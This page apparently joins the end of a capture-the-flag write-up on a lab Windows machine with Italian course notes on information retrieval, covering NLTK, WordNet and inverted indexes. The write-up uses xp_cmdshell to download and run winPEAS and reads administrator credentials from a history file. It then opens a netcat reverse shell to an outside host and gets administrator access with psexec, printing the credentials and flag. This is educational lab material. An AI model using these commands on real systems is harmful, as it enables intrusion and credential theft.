It was originally made to enumerate all the possible ways or methods to get admin privileges on a Windows machine.
To install it on kali or any debian-based distribution you can use the following
command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install peass
</code></pre></div><p>Use this other command to locate all the executable files that you
just downloaded:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">winpeas --help
&gt; peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/winpeas
 winPEASany.exe
 winPEASany_ofs.exe
 winPEAS.bat
 winPEASx64.exe
 winPEASx64_ofs.exe
 winPEASx86.exe
 winPEASx86_ofs.exe
</code></pre></div><p>Now I had to find a way to inject the executable file in the server.
A simple way of doing it is setting up a python server on the local
machine (that is by-default listening on port 8000).
<strong><em>Remember to run the command from the directory where the winpeas .exe
files are stored!</em></strong> (I lost a lot of time on this one point).</p>
<p>The directory should be /usr/share/peass/winpeas.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server
</code></pre></div><p>Now we can use <strong>powershell</strong> to inject the file!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe&#39;</span>;
</code></pre></div><p>The file should be loaded in the target machine. Now it&rsquo;s just matter
of executing it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;c:\\Users\Public\\winPEASx64.exe&#39;</span>;

[...]
<span style="color:#960050;background-color:#1e0010">╔══════════╣</span> <span style="color:#66d9ef">Found</span> History Files

File: <span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>sql_svc<span style="color:#960050;background-color:#1e0010">\</span>AppData<span style="color:#960050;background-color:#1e0010">\</span>Roaming<span style="color:#960050;background-color:#1e0010">\</span>Microsoft<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>PowerShell<span style="color:#960050;background-color:#1e0010">\</span>PSReadLine<span style="color:#960050;background-color:#1e0010">\</span>ConsoleHost_history.txt

<span style="color:#66d9ef">NULL</span>
[...]
</code></pre></div><p>History files are usually vulnerable and a good source of information,
let&rsquo;s see what&rsquo;s inside:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&#39;</span>;

net.exe use T: <span style="color:#960050;background-color:#1e0010">\\</span>Archetype<span style="color:#960050;background-color:#1e0010">\</span>backups <span style="color:#f92672">/</span><span style="color:#66d9ef">user</span>:administrator MEGACORP_4dm1n<span style="color:#f92672">!!</span>
</code></pre></div><p>We found administrator credentials!</p>
<ul>
<li><strong>user</strong>: administrator</li>
<li><strong>password</strong>: MEGACORP_4dm1n!!</li>
</ul>
<h4 id="reverseshell">ReverseShell<a href="#reverseshell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Now that we have admin credentials, it&rsquo;s time to spawn a reverse-shell.</p>
<p><a href="https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/">https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#34;c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe&#34;</span>;
</code></pre></div><p>Now we can just navigate to C:\Users\sql_svc\Desktop and get the
user flag.
We are not done yet, because we still have to find the <strong>root flag</strong>.</p>
<p>Turns out that in Windows you can&rsquo;t change privileges from inside the
cmd prompt, so we need to find a way to spawn a shell <em>as administrator</em>.
Guess what, impacket will help us one more time!
<a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes">https://blog.ropnop.com/using-credentials-to-own-windows-boxes</a></p>
<p>We can use <strong>psexec.py</strong> to do exactly what we need:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psexec.py Archetype/administrator@10.129.189.185
</code></pre></div><p>Now just navigate to C:\Users\Administrator\Desktop and get
the root flag. You can use</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">more root.txt
</code></pre></div><blockquote>
<p>root flag &ndash;&gt; b91ccec3305e98240082d4474b848528</p>
</blockquote>
<h2 id="inform-dot-retrieval">Inform. Retrieval<a href="#inform-dot-retrieval" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="gestione">Gestione dell&rsquo;informazione ITA-(2022/2023)<a href="#gestione" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h4 id="cosa-posso-trovare-qui"><em>Cosa posso trovare qui?</em><a href="#cosa-posso-trovare-qui" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Questa pagina (in italiano) contiene i miei appunti del corso di
&ldquo;Gestione dell&rsquo;informazione&rdquo; del corso di laurea triennale in informatica
di Unimore.
Verranno quindi riportati gli approfondimenti/chiarimenti che vengono
fatti durante le lezioni. Il materiale non è sostitutivo alle slide del corso.</p>
<p>→ Link per accedere al <code>materiale didattico</code>:</p>
<p><a href="https://moodle.unimore.it/course/view.php?id=7287">https://moodle.unimore.it/course/view.php?id=7287</a></p>
<h4 id="troubleshooting"><em>Troubleshooting</em><a href="#troubleshooting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Se la pagina non carica correttamente i contenuti in latec, basta <code>ricaricare</code> la pagina
una o al massimo un paio di volte. Questo problema può essere legato alla grande
quantità di testo e immagini presenti in questa sezione.</p>
<hr>
<h4 id="ir--table-of-contents">(IR) TABLE OF CONTENTS<a href="#ir--table-of-contents" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<ul>
<li><a href="#text-operations">Text Operations</a></li>
<li><a href="#full-text-indexing">Full Text Indexing</a></li>
</ul>
<hr>
<h4 id="text-operations">Text Operations<a href="#text-operations" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Document Processing</p>
<ul>
<li>
<p><strong><code>Analisi lessicale</code></strong>: si converte una sequenza di caratteri in una sequenza
di token, dei potenziali canditati per dei termini &ldquo;index&rdquo;.</p>
</li>
<li>
<p><strong><code>Eliminazione delle stopwords</code></strong>: vengono eliminate quelle parole &ldquo;inutili&rdquo;
che non danno informazioni per la ricerca.</p>
</li>
<li>
<p><strong><code>Stemming e Lemmatization</code></strong>: esempio di uno <strong>stem</strong> &ndash;&gt; &lsquo;connect&rsquo; è lo stem
di parole come &lsquo;connected&rsquo;, &lsquo;connection&rsquo;, &lsquo;connecting&rsquo;. Lo <strong>stemmer</strong> è
il tool che si occupa della stemmization.</p>
<p>esempio di un <strong>lemma</strong> &ndash;&gt; &lsquo;see&rsquo; è il lemma per &lsquo;seen&rsquo; &lsquo;saw&rsquo;; Il <strong>lemmatizer</strong>
si occupa della generazione dei lemma.</p>
<p>Esistono alcuni parametri per giudicare uno stemmer: (i) <strong>correttezza</strong>, (ii) <strong>efficacia</strong>,
(iii) miglioramento della <strong>performance</strong>.</p>
</li>
<li>
<p><strong><code>Selezione degli Index</code></strong> in pratica vengono scelti i token più
significativi. Può essere fatta manualmente (da esperti) oppure automaticamente.
Esempio: &ldquo;Say&rdquo; &ldquo;Chair&rdquo; &ldquo;Be&rdquo; &ldquo;Enough&rdquo; &ndash;&gt; &ldquo;Chair&rdquo;</p>
</li>
<li>
<p><strong><code>Parsing</code></strong>: processo di analizzare uno stream di dati input e verificare la sua
correttezza sintattica. Questi strumenti (detti parser) lavorano sulla base
di &ldquo;banche dati&rdquo; usando un approccio statistico.</p>
</li>
<li>
<p><strong><code>Tagging</code></strong>: processo che assegna alle parole il loro ruolo all&rsquo;interno della frase.</p>
</li>
</ul>
<p>(Verbo, Nome, Aggettivo, ecc&hellip;)</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Thesauri</p>
<p>Un <strong>Thesaurus</strong> è una lista di parole (sinonimi e contrari) importanti in un dato domain di conoscenza.
Ad esempio, in ambito medico, alla parola &ldquo;hand&rdquo; potrebbero essere collegati concetti
come &ldquo;sanityzers&rdquo;, &ldquo;transplantation&rdquo;, ecc..
A livello strutturale sono quindi dei <em>dizionari</em> che contengono associazioni.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Python NLTK, the basics</p>
<p>In questo script vengono trattati i seguenti argomenti:
(i) Generazione dei token, (ii) Rimozione delle stopwords, (iii) Lemmatizzazione,
(iv) Stemming, (v) Tagging.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
<span style="color:#f92672">from</span> nltk.corpus <span style="color:#f92672">import</span> stopwords
<span style="color:#f92672">from</span> nltk.stem.porter <span style="color:#f92672">import</span> PorterStemmer
<span style="color:#f92672">from</span> nltk.stem.lancaster <span style="color:#f92672">import</span> LancasterStemmer

text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;This is a tests&#34;</span>
tokens <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</span>word_tokenize(text)
print(tokens)

<span style="color:#75715e"># Stopwords removal and Lemmatization</span>
wnl <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</span>WordNetLemmatizer()
<span style="color:#75715e"># per stampare tutte le parole che non sono stopwords.</span>
<span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens:
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> t <span style="color:#f92672">in</span> stopwords<span style="color:#f92672">.</span>words(<span style="color:#e6db74">&#39;english&#39;</span>):
	print(wnl<span style="color:#f92672">.</span>lemmatize(t))

<span style="color:#75715e"># --&gt; [&#39;This&#39;, &#39;is&#39;, &#39;a&#39;, &#39;tests&#39;]</span>
<span style="color:#75715e">#     This</span>
<span style="color:#75715e">#     test</span>


<span style="color:#75715e"># Stemming, using Porter and Lancaster, two popular stemmers</span>
<span style="color:#75715e"># They give the same output for easy input</span>
porter <span style="color:#f92672">=</span> PorterStemmer()
print([porter<span style="color:#f92672">.</span>stem(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])

lancaster <span style="color:#f92672">=</span> LancasterStemmer()
print([lancaster<span style="color:#f92672">.</span>stem(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])

<span style="color:#75715e"># POS tagging a list of lemmatizen tokens!</span>
print([nltk<span style="color:#f92672">.</span>pos_tag([wnl<span style="color:#f92672">.</span>lemmatize(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens])])
<span style="color:#75715e"># --&gt; [[(&#39;This&#39;, &#39;DT&#39;), (&#39;is&#39;, &#39;VBZ&#39;), (&#39;a&#39;, &#39;DT&#39;), (&#39;test&#39;, &#39;NN&#39;)]]</span>
</code></pre></div><p><strong>Esercizio 1:</strong></p>
<p>eseguire le seguenti operazioni: (i)Tokenization, (ii)Elimination of stopwords, (iii)Stemming, (iv) Selection of nouns
su un file .txt contenente un libro di testo.
In questo caso ho scaricato una copia locale del file, per semplicità.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
<span style="color:#f92672">from</span> nltk.corpus <span style="color:#f92672">import</span> stopwords
<span style="color:#f92672">from</span> nltk.stem.porter <span style="color:#f92672">import</span> PorterStemmer

path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./book.txt&#34;</span>
file <span style="color:#f92672">=</span> open(path)
raw <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
print(len(raw))

<span style="color:#75715e">#step1: tokenization</span>
tokens <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</span>word_tokenize(raw)
print(tokens[:<span style="color:#ae81ff">20</span>])

<span style="color:#75715e">#step2: eliminate stopwords</span>
no_stop_tokens <span style="color:#f92672">=</span> [t <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> t <span style="color:#f92672">in</span> stopwords<span style="color:#f92672">.</span>words(<span style="color:#e6db74">&#39;english&#39;</span>)]
print(len(no_stop_tokens))

<span style="color:#75715e">#step3: stemming</span>
porter <span style="color:#f92672">=</span> PorterStemmer()
stemmed_tokens <span style="color:#f92672">=</span> ([porter<span style="color:#f92672">.</span>stem(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> no_stop_tokens])

<span style="color:#75715e">#step4: get nouns thanks to tagging</span>
tagged_tokens <span style="color:#f92672">=</span> (nltk<span style="color:#f92672">.</span>pos_tag([t <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> stemmed_tokens]))
print(tagged_tokens[:<span style="color:#ae81ff">20</span>])
nouns <span style="color:#f92672">=</span> [t[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tagged_tokens <span style="color:#66d9ef">if</span> t[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;NN&#39;</span>]
print(nouns[:<span style="color:#ae81ff">20</span>])
</code></pre></div></li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Wordnet (Thesaurus)</p>
<p><code>Synset</code> &ndash;&gt; concetto, può essere rappresentato da più parole.
In un generico thesaurus sono chiamati <em>Thesaurus Index Term</em>.</p>

  <figure class="left" >
    <img src="/ox-hugo/thes.png"   />
    
  </figure>


<p>Wordnet mette a disposizione una serie di relazioni tra i synset,
come i seguenti:</p>

  <figure class="left" >
    <img src="/ox-hugo/relazioni.png"   />
    
  </figure>


<p>La relazioni solitamente più usate sono <strong>Hypernymy</strong> e <strong>Meronymy</strong>.
Usare un thesaurus non è sempre una scelta corretta. In
un search engine generico come google non ha senso, dato che il
grafo delle relazioni diventerebbe enorme senza portare grossi benefici.
Al contrario è molto utile in casi specifici (e.g. search engine per
paper in ambito medico).</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Word similarities</p>
<p><strong><code>sinonimia</code></strong> &ndash;&gt; relazione binaria che lega due parole attraverso
il significato.</p>
<p><strong><code>similarità o distanza</code></strong> &ndash;&gt; metrica più &ldquo;loose&rdquo; per dare un gradiente
di similarità.</p>
<p>Queste relazioni non vanno confuse con le relazioni del thesaurus.
Ad esempio benzina e macchina potrebbero essere collegate nel thesaurus
ma potrebbero anche non essere sinonimi!</p>
<p>Come misurare la similarità tra concetti? (<em>i</em>)path based (<em>ii</em>)information content measures.</p>
<ul>
<li><strong>Path based</strong>: sfrutto la gerarchia di ipernimia per stabilire il &ldquo;livello&rdquo; di
somiglianza di due concetti. Esistono principalmente 2 formule per effettuare
il calcolo: (<em>i</em>) path distance similarity, (<em>ii</em>) Wu-Palmer similarity.</li>
</ul>

  <figure class="left" >
    <img src="/ox-hugo/pathdistance.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 14: </span>Path based similarities</figcaption>
    
  </figure>


<p><strong><code>Path distance</code></strong> similarity:</p>
<p>\begin{equation}
sim_{path-distance}(c_{1}, c_{2})= \frac{1}{ShortestPath(c_{1}, c_{2})+1}
\end{equation}</p>
<p><strong><code>Wu-Palmer</code></strong> similarity:</p>
<p>\begin{equation}
sim_{Wu-Palmer}(c_{1}, c_{2})= \frac{2*depth(LCS(c_{1},c_{2}))}{depth(c_{1})+depth(c_{2})}
\end{equation}</p>
<p>Il problema della prima formula è che è molto discontinua
e genera dei valori non ben distribuiti. Questo problema
viene risolto da Wu-Palmer con la loro formula.
Per chiarezza, LCS &ndash;&gt; Least Common Subsumer.</p>
<ul>
<li>
<p><strong>Information content mesaures</strong>: quanto spesso questi
concetti vengono usati nello stesso contesto.
Dato un concetto, definisco con P(c) la probabilità
che scelta una parola a caso  in un corpus rappresenti
il determinato concetto.</p>
<p><strong>Information content:</strong> Può essere interpretato
come il <em>livello di sorpresa</em> di un particolare concetto. Questo indice
infatti è alto quando c è un synset &ldquo;raro&rdquo; o &ldquo;inaspettato&rdquo;.</p>
<p>\begin{equation}
IC( c) = -log P( c)
\end{equation}</p>
</li>
</ul>
<p>Similarità di <strong><code>Resnik</code></strong>: calcolo l&rsquo;information content del
least common subsumer.</p>
<p>\begin{equation}
sim_{resnik}(c_{1}, c_{2}) = -log(P(LCS(c1,c2)))
\end{equation}</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Word Sense disambiguation</p>
<p>La WSD consiste essenzialmente nell&rsquo;assegnare il senso corretto ad ogni
istanza di una certa parola di interesse.</p>
<ol>
<li>Determinare tutti i sensi che quella parola può assumere: abbastanza
automatico usando un thesaurus;</li>
<li>Analizzare il contesto dove la parola compare.
<ul>
<li><strong>Bag of words</strong>: il <em>contesto</em> è rappresentato da un pool di parole
&ldquo;vicine&rdquo; al termine di interesse che vengono estratte.</li>
<li><strong>Relational information:</strong> approccio più complesso che estrae altri
parametri come la distanza.</li>
</ul>
</li>
</ol>
<p>Ecco un&rsquo;approccio per implementare il tutto:</p>
<pre tabindex="0"><code class="language-example" data-lang="example">for each noun N, for each sense Sn of N:
  compute confidence Csn in choosing sn as sense of N
select sense with higher confidence
</code></pre><p>Ora la domanda è: come calcolo la <code>confidence</code> \(C_{s_{n}}\) ?</p>
<p>\(\rightarrow\) mi baso sulla similarità tra \(s_{n}\) e tutti gli altri sensi delle parole
nel contesto! Poi per calcolare la similitudine posso usare tecniche come la <em>path-based</em>,
già discussa in precedenza.</p>
<p>Ricapitolando, ecco lo pseudocodice dell&rsquo;algoritmo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">max_confidence <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">for</span> each Si synset di I:
  confidence <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
  <span style="color:#66d9ef">for</span> each J term <span style="color:#f92672">in</span> context:
    max <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> each Sj synset of J:
      similarity <span style="color:#f92672">=</span> simil(Sj, Si)
      <span style="color:#66d9ef">if</span>(similarity <span style="color:#f92672">&gt;</span> max):
	max <span style="color:#f92672">=</span> similarity
    confidence <span style="color:#f92672">+=</span> max
  <span style="color:#66d9ef">if</span>(confidence <span style="color:#f92672">&gt;</span> max_confidence):
    max_confidence <span style="color:#f92672">=</span> confidence
pick(synseth_with_confidence(max_confidence))
</code></pre></div><p>Codice effettivo di un semplice word sense disambiguator in python:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disambiguateTerms</span>(terms):
  <span style="color:#66d9ef">for</span> t_i <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_i is target term</span>
    selSense <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
    selScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
    <span style="color:#66d9ef">for</span> s_ti <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_i, wn<span style="color:#f92672">.</span>NOUN):
      score_i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
      <span style="color:#66d9ef">for</span> t_j <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_j term in t_i&#39;s context window</span>
	<span style="color:#66d9ef">if</span> (t_i<span style="color:#f92672">==</span>t_j):
	  <span style="color:#66d9ef">continue</span>
	bestScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
	  <span style="color:#66d9ef">for</span> s_tj <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_j, wn<span style="color:#f92672">.</span>NOUN):
	    tempScore <span style="color:#f92672">=</span> s_ti<span style="color:#f92672">.</span>wup_similarity(s_tj)
	    <span style="color:#66d9ef">if</span> (tempScore<span style="color:#f92672">&gt;</span>bestScore):
	      bestScore<span style="color:#f92672">=</span>tempScore
	  score_i <span style="color:#f92672">=</span> score_i <span style="color:#f92672">+</span> bestScore
      <span style="color:#66d9ef">if</span> (score_i<span style="color:#f92672">&gt;</span>selScore):
	selScore <span style="color:#f92672">=</span> score_i
	selSense <span style="color:#f92672">=</span> s_ti
    <span style="color:#66d9ef">if</span> (selSense <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>):
      print(t_i,<span style="color:#e6db74">&#34;: &#34;</span>,selSense,<span style="color:#e6db74">&#34;, &#34;</span>,selSense<span style="color:#f92672">.</span>definition())
      print(<span style="color:#e6db74">&#34;Score: &#34;</span>,selScore)
    <span style="color:#66d9ef">else</span>:
      print(t_i,<span style="color:#e6db74">&#34;: --&#34;</span>)
</code></pre></div></li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Query Expansion</p>
<p>Esercizio sull&rsquo;espansione di query.
Proposta di algoritmo / soluzione:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> nltk
<span style="color:#f92672">from</span> nltk.corpus <span style="color:#f92672">import</span> stopwords
<span style="color:#f92672">from</span> nltk.stem.porter <span style="color:#f92672">import</span> PorterStemmer
<span style="color:#f92672">from</span> nltk.corpus <span style="color:#f92672">import</span> wordnet <span style="color:#66d9ef">as</span> wn

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disambiguateTerms</span>(terms):
    selected_syns <span style="color:#f92672">=</span> []
    syns_defs <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">for</span> t_i <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_i is target term</span>
	selSense <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
	selScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
	<span style="color:#66d9ef">for</span> s_ti <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_i, wn<span style="color:#f92672">.</span>NOUN):
	    score_i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
	    <span style="color:#66d9ef">for</span> t_j <span style="color:#f92672">in</span> terms: <span style="color:#75715e"># t_j term in t_i&#39;s context window</span>
		<span style="color:#66d9ef">if</span> (t_i<span style="color:#f92672">==</span>t_j):
		    <span style="color:#66d9ef">continue</span>
		bestScore <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
		<span style="color:#66d9ef">for</span> s_tj <span style="color:#f92672">in</span> wn<span style="color:#f92672">.</span>synsets(t_j, wn<span style="color:#f92672">.</span>NOUN):
		    tempScore <span style="color:#f92672">=</span> s_ti<span style="color:#f92672">.</span>wup_similarity(s_tj)
		    <span style="color:#66d9ef">if</span> (tempScore<span style="color:#f92672">&gt;</span>bestScore):
			bestScore<span style="color:#f92672">=</span>tempScore
		score_i <span style="color:#f92672">=</span> score_i <span style="color:#f92672">+</span> bestScore
	    <span style="color:#66d9ef">if</span> (score_i<span style="color:#f92672">&gt;</span>selScore):
		selScore <span style="color:#f92672">=</span> score_i
		selSense <span style="color:#f92672">=</span> s_ti
	<span style="color:#66d9ef">if</span> (selSense <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>):
	    selected_syns<span style="color:#f92672">.</span>append(selSense)
	    syns_defs<span style="color:#f92672">.</span>append(selSense<span style="color:#f92672">.</span>definition())
    <span style="color:#66d9ef">return</span> selected_syns, syns_defs

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">expand_query</span>(syns):
    res <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> syns:
	<span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> s<span style="color:#f92672">.</span>lemmas():
	      res<span style="color:#f92672">.</span>append(l<span style="color:#f92672">.</span>name())
    <span style="color:#66d9ef">return</span> res


raw <span style="color:#f92672">=</span> input (<span style="color:#e6db74">&#34;Insert query: &#34;</span>)
tokens <span style="color:#f92672">=</span> nltk<span style="color:#f92672">.</span>word_tokenize(raw)
nostokens <span style="color:#f92672">=</span> [t <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> t <span style="color:#f92672">in</span> stopwords<span style="color:#f92672">.</span>words(<span style="color:#e6db74">&#39;english&#39;</span>)]
tagged_tokens <span style="color:#f92672">=</span> (nltk<span style="color:#f92672">.</span>pos_tag([t <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> nostokens]))
pool <span style="color:#f92672">=</span> [wn<span style="color:#f92672">.</span>morphy(x[<span style="color:#ae81ff">0</span>]) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> tagged_tokens]
print(pool)

selected_syns, syns_def <span style="color:#f92672">=</span> disambiguateTerms(pool)
expanded_query <span style="color:#f92672">=</span> expand_query(selected_syns)
print(expanded_query)
</code></pre></div><hr>
</li>
</ul>
<h4 id="full-text-indexing">Full Text Indexing<a href="#full-text-indexing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Introduzione</p>
<p>Solitamente un indice è appropriato quando:</p>
<ol>
<li>Ho molti dati da gestire;</li>
<li>Quando ho un pool di dati semi-statico, quindi può essere aggiornato
periodicamente ma non supporta frequenze troppo alte.</li>
</ol>
<p>Gli index più usati sono (<em>i</em>) inverted indeces, (<em>ii</em>) suffix array, (<em>iii</em>) signature
files. Ovviamente si cercano sempre di capire i costi di accesso, di costruzione e
di aggiornamento.</p>
<ul>
<li>\(n\) &ndash;&gt; dimensione in byte occupati dal testo;</li>
<li>\(m\) &ndash;&gt; lunghezza del pattern che voglio cercare;</li>
<li>\(M\) &ndash;&gt; byte disponibili in memoria principale;</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>TrIe</p>
<p>(prefix tree)
Indice che memorizza stringhe, per velocizzare la ricerca e altre operazioni.</p>

  <figure class="left" >
    <img src="/ox-hugo/trie.png"   />
    
      <figcaption class="center" ><span class="figure-number">Figure 15: </span>Trie, prefix tree</figcaption>
    
  </figure>


<p>Costo di ricerca di una parola: \(O(m)\), quindi lineare rispetto al numero di
caratteri della parola che sto cercando.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Inverted Index</p>
<p>L&rsquo;idea è quella di memorizzare, per ogni termine \(t\), una lista di tutti i
documenti che contengono quella parola. Ecco le componenti pricipali di
un inverted index:</p>
<ol>
<li><strong><code>Vocabolario</code></strong> &ndash;&gt; insieme di tutte le parole contenute nella collezione di documenti.
Per ogni parola viene mantenuta come informazione il numero di documenti in cui
quella parola è presente (<em>document frequency</em>).</li>
<li><strong><code>Posting List</code></strong> &ndash;&gt; mantiene le informazioni riguardo alla precisa locazione
delle singole parole. Esistono due tipi di posting list:
<ul>
<li><strong>Document based</strong>: esempio &ndash;&gt; car:11 (4) &ndash;&gt; viene indicato <em>in che documento</em>
compare la parola e con quale frequenza.</li>
<li><strong>Word based</strong>: ho la <em>locazione</em> della parola di interesse nel documento,
a livello posizionale.</li>
</ul>
</li>
</ol>
<p>Qui sotto sono illustrati degli esempi di record che potrebbero essere presenti
in un inverted index. Notare come la document frequency coincida con il numero
di caselle presenti nella posting list. Questo è il caso in cui la posting
list sia <em>Document based</em>. Se fosse <em>Word Based</em>, ovviamente i nodi della
posting list sarebbero più ingombranti: invece della frequenza all&rsquo;interno
del documento, sarebbero indicate le precise posizioni delle istanze.</p>
<table>
<thead>
<tr>
<th>Index term</th>
<th>df</th>
<th>posting-list-couple</th>
<th>posting-list-couple</th>
</tr>
</thead>
<tbody>
<tr>
<td>computer</td>
<td>2</td>
<td>\(D_{7},4\)</td>
<td>\(D_{8},2\)</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>Index term</th>
<th>df</th>
<th>posting-list-couple</th>
<th>posting-list-couple</th>
<th>posting-list-couple</th>
</tr>
</thead>
<tbody>
<tr>
<td>database</td>
<td>3</td>
